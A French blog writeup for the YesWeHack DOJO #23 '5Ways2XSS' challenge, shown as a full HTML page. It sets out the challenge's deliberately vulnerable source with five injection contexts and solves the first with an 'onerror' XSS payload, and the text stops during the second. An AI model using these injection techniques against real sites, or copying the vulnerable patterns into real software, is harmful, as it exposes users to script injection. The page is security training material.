@@ -1,0 +1,1292 @@
+<!DOCTYPE html>
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en-us" lang="en-us">
+<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+    
+
+
+
+
+
+
+
+
+
+
+    
+
+
+
+
+
+
+
+<script defer language="javascript" type="text/javascript" src="/js/bundle.min.145453261a7755f5042a854c4213501d215a8fbe34c08d181c40f803f1315e74.js"></script>
+
+
+
+
+
+
+    
+    <meta http-equiv="content-type" content="text/html; charset=utf-8">
+
+    
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+    
+    <link rel="icon" href=/images/favicon.png>
+
+    
+    
+
+
+
+
+
+  
+
+
+
+
+
+  
+  
+  
+
+
+<!-- Open Graph image and Twitter Card metadata -->
+
+<title itemprop="name">Vozec&#39;s Blog - Writeup 5Ways2XSS - DOJO #23 | YesWeHack</title>
+<meta property="og:title" content=Vozec&#39;s&#32;Blog&#32;-&#32;Writeup&#32;5Ways2XSS&#32;-&#32;DOJO&#32;#23&#32;|&#32;YesWeHack />
+<meta name="twitter:title" content=Vozec&#39;s&#32;Blog&#32;-&#32;Writeup&#32;5Ways2XSS&#32;-&#32;DOJO&#32;#23&#32;|&#32;YesWeHack />
+<meta itemprop="name" content=Vozec&#39;s&#32;Blog&#32;-&#32;Writeup&#32;5Ways2XSS&#32;-&#32;DOJO&#32;#23&#32;|&#32;YesWeHack />
+<meta name="application-name" content=Vozec&#39;s&#32;Blog&#32;-&#32;Writeup&#32;5Ways2XSS&#32;-&#32;DOJO&#32;#23&#32;|&#32;YesWeHack />
+<meta property="og:site_name" content="" />
+
+
+<meta name="description" content="5Ways2XSS - DOJO #23 | YesWeHack" />
+<meta itemprop="description" content="5Ways2XSS - DOJO #23 | YesWeHack" />
+<meta property="og:description" content="5Ways2XSS - DOJO #23 | YesWeHack" />
+<meta name="twitter:description" content="5Ways2XSS - DOJO #23 | YesWeHack" />
+
+
+<base href="//localhost:1313/writeups/yeswehack_dojo_23/" />
+<link rel="canonical" href="//localhost:1313/writeups/yeswehack_dojo_23/" itemprop="url" />
+<meta name="url" content="//localhost:1313/writeups/yeswehack_dojo_23/" />
+<meta name="twitter:url" content="//localhost:1313/writeups/yeswehack_dojo_23/" />
+<meta property="og:url" content="//localhost:1313/writeups/yeswehack_dojo_23/" />
+
+
+<meta property="og:updated_time" content="2023-05-15T12:00:00Z" />
+
+
+<link rel="sitemap" type="application/xml" title="Sitemap" href='//localhost:1313/sitemap.xml' />
+
+<meta name="robots" content="index,follow" />
+<meta name="googlebot" content="index,follow" />
+
+
+<meta name="twitter:site" content="https://twitter.com/Vozec1" />
+<meta name="twitter:creator" content="https://twitter.com/Vozec1" />
+<meta property="fb:admins" content="" />
+
+
+<meta name="apple-mobile-web-app-title" content="" />
+<meta name="apple-mobile-web-app-capable" content="yes" />
+<meta name="apple-mobile-web-app-status-bar-style" content="black" />
+
+
+
+
+
+
+<meta name="generator" content="Hugo 0.134.1">
+
+
+    
+    
+
+<link type="text/css" rel="stylesheet" href="/css/bundle.min.94a339836f89f0d25f31980cb6b0631da21e20af128308747ce44e0525eb16ef.css">
+
+
+    
+    <style>
+    body {
+        --sidebar-bg-color: #202020;
+        --sidebar-img-border-color: #515151;
+        --sidebar-p-color: #909090;
+        --sidebar-h1-color: #FFF;
+        --sidebar-a-color: #FFF;
+        --sidebar-socials-color: #FFF;
+        --text-color: #222;
+        --bkg-color: #FAF9F6;
+        --post-title-color: #303030;
+        --list-color: #5A5A5A;
+        --link-color: #268BD2;
+        --date-color: #515151;
+        --table-border-color: #E5E5E5;
+        --table-stripe-color: #F9F9F9;
+        --code-color: #000;
+        --code-background-color: #E5E5E5;
+        --code-block-color: #FFF;
+        --code-block-background-color: #272822;
+        --moon-sun-color: #FFF;
+        --moon-sun-background-color: #515151;
+    }
+    body.dark-theme {
+        --text-color: #EEE;
+        --bkg-color: #121212;
+        --post-title-color: #DBE2E9;
+        --list-color: #9D9D9D;
+        --link-color: #268BD2;
+        --date-color: #9A9A9A;
+        --table-border-color: #515151;
+        --table-stripe-color: #202020;
+        --code-color: #FFF;
+        --code-background-color: #515151;
+        --code-block-color: #FFF;
+        --code-block-background-color: #272822;
+    }
+    body {
+        background-color: var(--bkg-color);
+    }
+</style>
+
+</head>
+
+    <body class="dark-theme">
+        <div class="wrapper">
+            <aside class="sidebar">
+    <div class="container sidebar-sticky">
+        <div class="light-dark" align="right">
+    <button class="btn-light-dark" title="Toggle light/dark mode">
+        <svg class="moon" xmlns="http://www.w3.org/2000/svg" width="1em" height="1em" viewBox="0 0 16 16">
+            <path fill="currentColor" d="M6 .278a.768.768 0 0 1 .08.858a7.208 7.208 0 0 0-.878 3.46c0 4.021 3.278 7.277 7.318 7.277c.527 0 1.04-.055 1.533-.16a.787.787 0 0 1 .81.316a.733.733 0 0 1-.031.893A8.349 8.349 0 0 1 8.344 16C3.734 16 0 12.286 0 7.71C0 4.266 2.114 1.312 5.124.06A.752.752 0 0 1 6 .278z"/>
+        </svg>
+        <svg class="sun" xmlns="http://www.w3.org/2000/svg" width="1em" height="1em" viewBox="0 0 16 16">
+            <path fill="currentColor" d="M8 12a4 4 0 1 0 0-8a4 4 0 0 0 0 8zM8 0a.5.5 0 0 1 .5.5v2a.5.5 0 0 1-1 0v-2A.5.5 0 0 1 8 0zm0 13a.5.5 0 0 1 .5.5v2a.5.5 0 0 1-1 0v-2A.5.5 0 0 1 8 13zm8-5a.5.5 0 0 1-.5.5h-2a.5.5 0 0 1 0-1h2a.5.5 0 0 1 .5.5zM3 8a.5.5 0 0 1-.5.5h-2a.5.5 0 0 1 0-1h2A.5.5 0 0 1 3 8zm10.657-5.657a.5.5 0 0 1 0 .707l-1.414 1.415a.5.5 0 1 1-.707-.708l1.414-1.414a.5.5 0 0 1 .707 0zm-9.193 9.193a.5.5 0 0 1 0 .707L3.05 13.657a.5.5 0 0 1-.707-.707l1.414-1.414a.5.5 0 0 1 .707 0zm9.193 2.121a.5.5 0 0 1-.707 0l-1.414-1.414a.5.5 0 0 1 .707-.707l1.414 1.414a.5.5 0 0 1 0 .707zM4.464 4.465a.5.5 0 0 1-.707 0L2.343 3.05a.5.5 0 1 1 .707-.707l1.414 1.414a.5.5 0 0 1 0 .708z"/>
+        </svg>
+    </button>
+</div>
+
+        <div class="sidebar-about">
+    <h1 class="brand">
+        
+            <a href="//localhost:1313/">
+                <img src="https://avatars.githubusercontent.com/u/61807609?v=4" alt="brand image">
+            </a>
+        
+        
+            <a href="//localhost:1313/">
+                <h1>Vozec&#39;s Blog</h1>
+            </a>
+        
+    </h1>
+    <p class="lead">
+    A student passionate about cybersecurity
+    </p>
+</div>
+
+        <nav>
+    <ul class="sidebar-nav">
+
+        
+        
+        
+        
+            
+
+            
+                
+                
+                    <li class="heading">
+                        <a href="/about/">About</a>
+                    </li>
+                    
+                
+            
+                
+                
+            
+                
+                
+            
+                
+                
+            
+                
+                
+            
+                
+                
+            
+                
+                
+            
+            
+                
+                
+                        
+                
+                        
+                
+                        
+                
+            
+                
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+            
+        
+        
+            
+
+            
+                
+                
+            
+                
+                
+            
+                
+                
+            
+                
+                
+            
+                
+                
+            
+                
+                
+            
+                
+                
+                    <li class="heading">
+                        <a href="/writeups/">Writeups</a>
+                    </li>
+                    
+                
+            
+            
+                
+                
+                        
+                
+                        
+                
+                        
+                
+            
+                
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+            
+        
+        
+            
+
+            
+                
+                
+            
+                
+                
+            
+                
+                
+            
+                
+                
+            
+                
+                
+                    <li class="heading">
+                        <a href="/researchs/">Researchs</a>
+                    </li>
+                    
+                
+            
+                
+                
+            
+                
+                
+            
+            
+                
+                
+                        
+                
+                        
+                
+                        
+                
+            
+                
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+            
+        
+        
+            
+
+            
+                
+                
+            
+                
+                
+            
+                
+                
+            
+                
+                
+            
+                
+                
+            
+                
+                
+                    <li class="heading">
+                        <a href="/rsa/">1/ Crypto RSA</a>
+                    </li>
+                    
+                
+            
+                
+                
+            
+            
+                
+                
+                        
+                
+                        
+                
+                        
+                
+            
+                
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+            
+        
+        
+            
+
+            
+                
+                
+            
+                
+                
+                    <li class="heading">
+                        <a href="/aes/">2/ Crypto AES</a>
+                    </li>
+                    
+                
+            
+                
+                
+            
+                
+                
+            
+                
+                
+            
+                
+                
+            
+                
+                
+            
+            
+                
+                
+                        
+                
+                        
+                
+                        
+                
+            
+                
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+            
+        
+        
+            
+
+            
+                
+                
+            
+                
+                
+            
+                
+                
+                    <li class="heading">
+                        <a href="/other/">3/ Crypto Other</a>
+                    </li>
+                    
+                
+            
+                
+                
+            
+                
+                
+            
+                
+                
+            
+                
+                
+            
+            
+                
+                
+                        
+                
+                        
+                
+                        
+                
+            
+                
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+            
+        
+
+    </ul>
+</nav>
+
+        
+    <a target="_blank" class="social" title="GitHub" href="https://github.com/Vozec">
+        <svg xmlns="http://www.w3.org/2000/svg" width="1.2em" height="1.2em" viewBox="-2 -2 24 24">
+            <path fill="currentColor" d="M18.88 1.099C18.147.366 17.265 0 16.233 0H3.746C2.714 0 1.832.366 1.099 1.099C.366 1.832 0 2.714 0 3.746v12.487c0 1.032.366 1.914 1.099 2.647c.733.733 1.615 1.099 2.647 1.099H6.66c.19 0 .333-.007.429-.02a.504.504 0 0 0 .286-.169c.095-.1.143-.245.143-.435l-.007-.885c-.004-.564-.006-1.01-.006-1.34l-.3.052c-.19.035-.43.05-.721.046a5.555 5.555 0 0 1-.904-.091a2.026 2.026 0 0 1-.872-.39a1.651 1.651 0 0 1-.572-.8l-.13-.3a3.25 3.25 0 0 0-.41-.663c-.186-.243-.375-.407-.566-.494l-.09-.065a.956.956 0 0 1-.17-.156a.723.723 0 0 1-.117-.182c-.026-.061-.004-.111.065-.15c.07-.04.195-.059.378-.059l.26.04c.173.034.388.138.643.311a2.1 2.1 0 0 1 .631.677c.2.355.44.626.722.813c.282.186.566.28.852.28c.286 0 .533-.022.742-.065a2.59 2.59 0 0 0 .585-.196c.078-.58.29-1.028.637-1.34a8.907 8.907 0 0 1-1.333-.234a5.314 5.314 0 0 1-1.223-.507a3.5 3.5 0 0 1-1.047-.872c-.277-.347-.505-.802-.683-1.365c-.177-.564-.266-1.215-.266-1.952c0-1.049.342-1.942 1.027-2.68c-.32-.788-.29-1.673.091-2.652c.252-.079.625-.02 1.119.175c.494.195.856.362 1.086.5c.23.14.414.257.553.352a9.233 9.233 0 0 1 2.497-.338c.859 0 1.691.113 2.498.338l.494-.312a6.997 6.997 0 0 1 1.197-.572c.46-.174.81-.221 1.054-.143c.39.98.424 1.864.103 2.653c.685.737 1.028 1.63 1.028 2.68c0 .737-.089 1.39-.267 1.957c-.177.568-.407 1.023-.689 1.366a3.65 3.65 0 0 1-1.053.865c-.42.234-.828.403-1.223.507a8.9 8.9 0 0 1-1.333.235c.45.39.676 1.005.676 1.846v3.11c0 .147.021.266.065.357a.36.36 0 0 0 .208.189c.096.034.18.056.254.064c.074.01.18.013.318.013h2.914c1.032 0 1.914-.366 2.647-1.099c.732-.732 1.099-1.615 1.099-2.647V3.746c0-1.032-.367-1.914-1.1-2.647z"/>
+        </svg>
+    </a>
+
+
+
+    <a target="_blank" class="social" title="LinkedIn" href="https://www.linkedin.com/in/arthur-dlfr/">
+        <svg xmlns="http://www.w3.org/2000/svg" width="1em" height="1.2em" viewBox="0 0 448 512">
+            <path fill="currentColor" d="M416 32H31.9C14.3 32 0 46.5 0 64.3v383.4C0 465.5 14.3 480 31.9 480H416c17.6 0 32-14.5 32-32.3V64.3c0-17.8-14.4-32.3-32-32.3zM135.4 416H69V202.2h66.5V416zm-33.2-243c-21.3 0-38.5-17.3-38.5-38.5S80.9 96 102.2 96c21.2 0 38.5 17.3 38.5 38.5c0 21.3-17.2 38.5-38.5 38.5zm282.1 243h-66.4V312c0-24.8-.5-56.7-34.5-56.7c-34.6 0-39.9 27-39.9 54.9V416h-66.4V202.2h63.7v29.2h.9c8.9-16.8 30.6-34.5 62.9-34.5c67.2 0 79.7 44.3 79.7 101.9V416z"/>
+        </svg>
+    </a>
+
+
+    <a target="_blank" class="social" title="Twitter" href="https://twitter.com/Vozec1">
+        <svg xmlns="http://www.w3.org/2000/svg" width="1.2em" height="1.2em" viewBox="0 0 16 16">
+            <path fill="currentColor" d="M5.032 14.286c6.037 0 9.34-4.837 9.34-9.032c0-.137 0-.274-.01-.41A6.56 6.56 0 0 0 16 3.2c-.6.256-1.235.425-1.885.5a3.207 3.207 0 0 0 1.443-1.757c-.645.37-1.35.63-2.085.77a3.322 3.322 0 0 0-1.862-.958a3.384 3.384 0 0 0-2.082.334a3.223 3.223 0 0 0-1.442 1.49a3.08 3.08 0 0 0-.208 2.03a9.57 9.57 0 0 1-3.747-.963a9.269 9.269 0 0 1-3.018-2.354a3.086 3.086 0 0 0-.36 2.314c.189.787.68 1.475 1.376 1.924a3.344 3.344 0 0 1-1.49-.398v.04c0 .734.263 1.444.743 2.01a3.3 3.3 0 0 0 1.89 1.102c-.483.128-.99.146-1.482.055a3.19 3.19 0 0 0 1.168 1.577a3.36 3.36 0 0 0 1.9.627A6.732 6.732 0 0 1 0 12.86a9.527 9.527 0 0 0 5.032 1.423"/>
+        </svg>
+    </a>
+
+
+
+
+    <a target="_blank" class="social" title="Discord" href="vozec">
+        <svg xmlns="http://www.w3.org/2000/svg" width="1.2em" height="1.2em" viewBox="0 0 24 24">
+            <path fill="currentColor" d="M19.27 5.33C17.94 4.71 16.5 4.26 15 4a.09.09 0 0 0-.07.03c-.18.33-.39.76-.53 1.09a16.09 16.09 0 0 0-4.8 0c-.14-.34-.35-.76-.54-1.09c-.01-.02-.04-.03-.07-.03c-1.5.26-2.93.71-4.27 1.33c-.01 0-.02.01-.03.02c-2.72 4.07-3.47 8.03-3.1 11.95c0 .02.01.04.03.05c1.8 1.32 3.53 2.12 5.24 2.65c.03.01.06 0 .07-.02c.4-.55.76-1.13 1.07-1.74c.02-.04 0-.08-.04-.09c-.57-.22-1.11-.48-1.64-.78c-.04-.02-.04-.08-.01-.11c.11-.08.22-.17.33-.25c.02-.02.05-.02.07-.01c3.44 1.57 7.15 1.57 10.55 0c.02-.01.05-.01.07.01c.11.09.22.17.33.26c.04.03.04.09-.01.11c-.52.31-1.07.56-1.64.78c-.04.01-.05.06-.04.09c.32.61.68 1.19 1.07 1.74c.03.01.06.02.09.01c1.72-.53 3.45-1.33 5.25-2.65c.02-.01.03-.03.03-.05c.44-4.53-.73-8.46-3.1-11.95c-.01-.01-.02-.02-.04-.02zM8.52 14.91c-1.03 0-1.89-.95-1.89-2.12s.84-2.12 1.89-2.12c1.06 0 1.9.96 1.89 2.12c0 1.17-.84 2.12-1.89 2.12zm6.97 0c-1.03 0-1.89-.95-1.89-2.12s.84-2.12 1.89-2.12c1.06 0 1.9.96 1.89 2.12c0 1.17-.83 2.12-1.89 2.12z"/>
+        </svg>
+    </a>
+
+
+
+
+
+
+
+
+
+
+    <a target="_blank" class="social" title="Email" href="https://www.root-me.org/Vozec">
+       <svg xmlns="http://www.w3.org/2000/svg" width="1em" height="1.2em" viewBox="0 0 485.211 485.211">
+            <path fill="currentColor" d="M301.393,241.631L464.866,424.56H20.332l163.474-182.928l58.801,51.443L301.393,241.631z M462.174,60.651H23.027 l219.579,192.142L462.174,60.651z M324.225,221.67l160.986,180.151V80.792L324.225,221.67z M0,80.792v321.029L160.972,221.64 L0,80.792z"/>
+       </svg>
+    </a>
+
+
+        <p class="footnote">
+powered by <a target="_blank" href="https://gohugo.io">Hugo</a> | themed with <a target="_blank" href="https://github.com/lukeorth/poison">poison</a>
+    <br>
+    &copy; 2024 . All rights reserved.
+</p>
+
+  </div>
+</aside>
+
+            <main class="content container">
+                <div class="post">
+  <div class="info">
+  <h1 class="post-title">
+    <a href="//localhost:1313/writeups/yeswehack_dojo_23/">Writeup 5Ways2XSS - DOJO #23 | YesWeHack</a>
+  </h1>
+
+  <div class="headline">
+    <div>
+      
+      <time datetime=" 2023-05-15T12:00:00Z" class="post-date">
+        May 15, 2023
+      </time>
+      
+      <span> - </span>
+      <span class="reading-time">
+        
+          
+        
+
+        <span>6 mins read</span>
+      </span>
+    </div>
+
+    
+    <ul class="tags">
+      
+      <li class="tag-xss">
+        <a href="//localhost:1313/tags/xss">xss</a>
+      </li>
+      
+      <li class="tag-tuto">
+        <a href="//localhost:1313/tags/tuto">tuto</a>
+      </li>
+      
+      <li class="tag-writeup">
+        <a href="//localhost:1313/tags/writeup">writeup</a>
+      </li>
+      
+    </ul>
+    
+  </div>
+
+  
+  
+
+  
+</div>
+
+  <h2 id="hint">/Hint</h2>
+<p>Concentrez-vous sur une section XSS à la fois pour éviter les maux de tête ! 😉<br>
+Aussi&hellip; les barres obliques <strong>(/)</strong> sont votre meilleur ami, qui a même besoin d&rsquo;espaces de nos jours&hellip; ?</p>
+<h2 id="-rules">/ Rules</h2>
+<p>Une solution valable doit répondre à toutes ces exigences :</p>
+<ul>
+<li>(1) XSS classique par l&rsquo;utilisation de balises HTML</li>
+<li>(2) XSS en restant à l&rsquo;intérieur des balises originales <em>&lt;script&gt;</em>.</li>
+<li>(3) XSS à l&rsquo;intérieur de la valeur &lsquo;src&rsquo; <em>(Ne pas sortir des guillemets)</em></li>
+<li>(4) XSS à l&rsquo;intérieur de la balise &lsquo;<!-- raw HTML omitted -->&rsquo; <em>(Ne créez pas une nouvelle balise HTML ou ne brisez pas la balise originale)</em></li>
+<li>(5)  Exécuter une DOM XSS en restant à l&rsquo;intérieur de la valeur d&rsquo;entrée <em>(Ne pas sortir des guillemets)</em></li>
+</ul>
+<h2 id="goal">/GOAL</h2>
+<p><strong>Suivre les règles et écrire une charge utile XSS unique qui s&rsquo;exécute sur les cinq entrées différentes ($xss)</strong></p>
+<h2 id="source-code">/Source Code</h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span><span style="color:#75715e">&lt;!DOCTYPE html&gt;</span>
+</span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">html</span>&gt;
+</span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">head</span>&gt;&lt;<span style="color:#f92672">title</span>&gt;5Ways2XSS&lt;/<span style="color:#f92672">title</span>&gt;&lt;/<span style="color:#f92672">head</span>&gt;
+</span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">body</span>&gt;
+</span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">center</span>&gt;&lt;<span style="color:#f92672">h1</span>&gt;Master the art of creating your own payloads&lt;/<span style="color:#f92672">h1</span>&gt;&lt;/<span style="color:#f92672">center</span>&gt;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">br</span>&gt;<span style="color:#75715e">&lt;!--(1) Classic XSS by using HTML tags --&gt;</span>
+</span></span><span style="display:flex;"><span>(1) $xss
+</span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">br</span>&gt;<span style="color:#75715e">&lt;!--(2) XSS inside the script tags--&gt;</span>
+</span></span><span style="display:flex;"><span>(2) &lt;<span style="color:#f92672">script</span>&gt;<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">v</span> <span style="color:#f92672">=</span> {<span style="color:#e6db74">&#39;xss&#39;</span><span style="color:#f92672">:</span><span style="color:#e6db74">`$xss`</span>};&lt;/<span style="color:#f92672">script</span>&gt;
+</span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">br</span>&gt;<span style="color:#75715e">&lt;!--(3) XSS inside the &#39;src&#39; (stay inside) --&gt;</span>
+</span></span><span style="display:flex;"><span>(3) &lt;<span style="color:#f92672">script</span> <span style="color:#a6e22e">src</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;$xss&#34;</span>&gt;&lt;/<span style="color:#f92672">script</span>&gt;              
+</span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">br</span>&gt;<span style="color:#75715e">&lt;!--(4) XSS inside the &#39;&lt;xss&gt;&#39; tag (stay inside) --&gt;</span>
+</span></span><span style="display:flex;"><span>(4) &lt;<span style="color:#f92672">XSS</span> <span style="color:#960050;background-color:#1e0010">$</span><span style="color:#a6e22e">xss</span>&gt;
+</span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">br</span>&gt;<span style="color:#75715e">&lt;!--(5) Execute a DOM XSS by staying *inside the input value* (no outbreak). Tip: Understanding how the &lt;script&gt; handles your value--&gt;</span>                                         
+</span></span><span style="display:flex;"><span>(5) &lt;<span style="color:#f92672">input</span> <span style="color:#a6e22e">type</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;search&#34;</span> <span style="color:#a6e22e">id</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;inpt&#34;</span> <span style="color:#a6e22e">value</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;$xss&#34;</span>&gt;    
+</span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">p</span> <span style="color:#a6e22e">id</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;dom&#34;</span>&gt;&lt;/<span style="color:#f92672">p</span>&gt;
+</span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">script</span>&gt;
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">v</span> <span style="color:#f92672">=</span> document.<span style="color:#a6e22e">getElementById</span>(<span style="color:#e6db74">&#39;inpt&#39;</span>).<span style="color:#a6e22e">value</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#e6db74">&#34;[DEBUG] (5) =&gt;&#34;</span>, <span style="color:#a6e22e">v</span>)<span style="color:#75715e">//DEBUG
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  document.<span style="color:#a6e22e">getElementById</span>(<span style="color:#e6db74">&#39;dom&#39;</span>).<span style="color:#a6e22e">innerHTML</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&lt;img src=&#34;x&#34; alt=&#34;&#39;</span><span style="color:#f92672">+</span><span style="color:#a6e22e">v</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#39;&#34;&gt;&#39;</span>;
+</span></span><span style="display:flex;"><span>&lt;/<span style="color:#f92672">script</span>&gt;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">&lt;!--[The code *below* is for design purposes only. It is not a part of the challenge]--&gt;</span>
+</span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">marquee</span> <span style="color:#a6e22e">direction</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;right&#34;</span>&gt;&lt;<span style="color:#f92672">b</span>&gt;...XSS&lt;/<span style="color:#f92672">b</span>&gt;&lt;<span style="color:#f92672">img</span> <span style="color:#a6e22e">id</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;a&#34;</span> <span style="color:#a6e22e">src</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;https://media4.giphy.com/media/QU86X0DlOCBCL5feZZ/giphy.gif&#34;</span>&gt;&lt;<span style="color:#f92672">img</span> <span style="color:#a6e22e">id</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;a&#34;</span> <span style="color:#a6e22e">src</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;https://media2.giphy.com/media/kyuWvPj8enRVAeUvfO/giphy.gif&#34;</span>&gt;&lt;/<span style="color:#f92672">marquee</span>&gt;&lt;<span style="color:#f92672">style</span>&gt;#a{<span style="color:#66d9ef">width</span>: <span style="color:#ae81ff">64</span><span style="color:#66d9ef">px</span>;<span style="color:#66d9ef">height</span>:<span style="color:#ae81ff">64</span><span style="color:#66d9ef">px</span>;}&lt;/<span style="color:#f92672">style</span>&gt;
+</span></span><span style="display:flex;"><span>&lt;/<span style="color:#f92672">body</span>&gt;
+</span></span><span style="display:flex;"><span>&lt;/<span style="color:#f92672">html</span>&gt;
+</span></span></code></pre></div><h2 id="première-approche">Première approche:</h2>
+<p>Le but de ce challenge est clair: trouver un payload qui valide 5 XSS dans 5 contextes différents.<br>
+Commencons pas comprendre le code.</p>
+<p>On nous propose un champ pour entrer notre payload et celui-ci est directement remplacé dans le <em>code HTML</em> à la place de <strong>$xss</strong>.</p>
+<p>J&rsquo;ai déja eu affaire à ce type de challenge par le passé, nottament lors du forum leHack à Paris en juin dernier. <em>(BitK on te voit ;))</em></p>
+<p>Le plus dur dans ce type de challenge n&rsquo;est pas de trouver les payloads valides pour chaque XSS mais bien les combiner entre eux pour former un unique payload polyglotte.</p>
+<h2 id="partie-1-résolution-des-xss-séparement">Partie 1) Résolution des XSS séparement:</h2>
+<p>Dans un premier temps, on s&rsquo;intérèsse séparement aux XSS pour bien comprendre leur méthode de fonctionnement.</p>
+<h3 id="xxs-n1-xss-classique-par-lutilisation-de-balises-html">XXS N°1: <em>XSS classique par l&rsquo;utilisation de balises HTML</em></h3>
+<p>Ici rien de plus simple, on peut directement injecter un <strong>img</strong>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>(1) $xss
+</span></span></code></pre></div><p>Payload: <code>&lt;img/src/onerror=console.log(1)&gt;</code></p>
+<h3 id="xxs-n2-xss-en-restant-à-lintérieur-des-balises-script-dorigine">XXS N°2: <em>XSS en restant à l&rsquo;intérieur des balises &lt;script&gt; d&rsquo;origine</em></h3>
+<p>L&rsquo;idée ici est de sortir du contexte du dictionnaire tout en restant dans le TAG <strong>script</strong>.</p>
